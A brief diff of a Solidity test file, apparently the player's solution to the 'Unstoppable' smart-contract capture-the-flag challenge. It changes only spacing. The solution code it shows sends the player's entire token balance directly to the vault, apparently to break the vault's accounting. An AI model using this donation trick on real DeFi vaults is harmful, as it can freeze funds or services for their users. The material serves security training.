@@ -92,7 +92,7 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     //checkSolvedByPlayer
-    function test_unstoppable() public checkSolvedByPlayer{
+    function test_unstoppable() public checkSolvedByPlayer {
         uint256 playerBalance = token.balanceOf(player);
         ERC20(address(token)).transfer(address(vault), playerBalance);
     }
